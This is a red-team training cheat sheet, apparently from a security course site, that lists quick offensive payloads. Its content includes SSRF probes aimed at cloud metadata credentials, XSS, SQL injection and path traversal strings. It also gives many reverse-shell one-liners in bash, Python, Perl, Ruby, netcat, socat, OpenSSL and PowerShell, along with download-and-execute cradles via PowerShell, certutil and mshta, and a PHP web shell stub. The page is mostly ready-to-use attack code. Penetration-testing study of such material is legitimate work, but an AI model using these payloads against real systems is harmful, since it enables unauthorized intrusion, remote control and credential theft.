---
layout: training-page
title: "Quick Payloads — Red Team Academy"
module: "Ops Cheatsheets"
tags:
  - cheatsheet
  - payloads
  - one-liners
page_key: "cheatsheets-quick-payloads"
render_with_liquid: false
updated: "2026-04-13"
---

# Quick Payloads

Curated **short probes and patterns** — not a full library. For depth, use the module pages (e.g. [SSRF](/web/ssrf/), [SQLi](/web/sql-injection/)). All hostnames and IPs are placeholders.

## Web — SSRF / callbacks

```
# Out-of-band callback (replace with your Collaborator / interactsh host)
http://<OAST_HOST>/
http://<OAST_HOST>/ssrf-probe

# Loopback probes (parameter may be ?url=, ?fetch=, ?src=, etc.)
http://127.0.0.1/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://[::1]/

# Cloud metadata (AWS IMDSv1 style — requires vulnerable SSRF)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP / Azure often need headers — see full SSRF page
```

## Web — XSS (minimal tests)

```
"><svg/onload=alert(1)>
'><script>alert(1)</script>
javascript:alert(1)
<img src=x onerror=alert(1)>
```

## Web — SQLi (quick differentiation)

```
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1' AND '1'='1
1 AND 1=1
1 AND 1=2
' UNION SELECT NULL,NULL--
```

## Web — path / file hints

```
../../../../etc/passwd
....//....//....//etc/passwd
/var/www/html/config.php
C:\Windows\win.ini
```

## Web — JWT (test only in lab / authorized targets)

```
# "none" algorithm abuse (classic test — many APIs reject it)
# Decode JWT, set alg to none, re-encode per your tool (jwt_tool, etc.)
```

## Reverse shells — bash / nc

```
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

nc -e /bin/sh <LHOST> <LPORT>
```

## PowerShell — download cradle (scoped use)

```
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')
```

## Active Directory — quick PowerShell stubs

```powershell
whoami /all
hostname; [Environment]::UserName; [Environment]::MachineName
Get-ADUser -Filter * -Properties ServicePrincipalName | ? {$_.ServicePrincipalName}
```

## Kerberos — roasting hints (use proper tools in engagement)

```
# Kerberoastable accounts often have SPNs — collect hashes with authorized tooling
# AS-REP: accounts with "Do not require Kerberos preauthentication"
```

## Linux — situational awareness

```
id; whoami; hostname
sudo -l
find / -perm -4000 2>/dev/null | head
ss -lntp
cat /etc/os-release
```

## Reverse Shells

Replace `LHOST` and `LPORT` with your listener. Start listener with `nc -lvnp LPORT` or `socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/bash`.

### Linux — Bash

```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# exec fd variant (works in more restricted shells):
exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done

# POSIX sh (when bash is unavailable):
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196

# UDP:
bash -i >& /dev/udp/LHOST/LPORT 0>&1
```

### Linux — Python / Perl / Ruby

```
# Python 3 with pty.spawn (full TTY):
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Perl:
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby:
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Linux — Netcat / Socat / OpenSSL

```
# Netcat with -e (GNU netcat):
nc -e /bin/bash LHOST LPORT

# Netcat without -e (OpenBSD/macOS nc):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f

# Socat basic:
socat TCP:LHOST:LPORT EXEC:/bin/bash

# Socat fully interactive PTY — best quality:
# Listener: socat file:`tty`,raw,echo=0 tcp-listen:LPORT
socat TCP:LHOST:LPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# OpenSSL encrypted (evades payload inspection):
# Listener: openssl s_server -quiet -key key.pem -cert cert.pem -port LPORT
openssl s_client -quiet -connect LHOST:LPORT|/bin/bash|openssl s_client -quiet -connect LHOST:LPORT
```

### Windows — PowerShell

```
# PS TCPClient (works on PS 2.0+):
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Download and exec from attacker HTTP server:
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
```

### Windows — cmd.exe / LOLBins

```
# cmd.exe via Python:
python -c "import socket,subprocess;s=socket.socket();s.connect(('LHOST',LPORT));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"

# certutil download + exec:
certutil.exe -urlcache -f http://LHOST/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

# mshta (bypasses basic application whitelisting):
mshta http://LHOST/shell.hta
```

### PHP (Web Shell Context)

```
# Command execution stub:
<?php system($_GET['cmd']); ?>

# Reverse shell via exec:
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Full fsockopen:
php -r '$s=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

### Upgrade Shell to TTY

```
# Step 1 — on target (Python pty spawn):
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2 — on attacker (background with Ctrl+Z, then):
stty raw -echo; fg

# Step 3 — on target after foregrounding (fix size):
export TERM=xterm
stty rows 50 cols 220
```

## Resources

- [SSRF](/web/ssrf/) — full chains and cloud metadata
- [SQL injection](/web/sql-injection/)
- [Reverse shells](/exploitation/reverse-shells/)
- PayloadsAllTheThings — [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
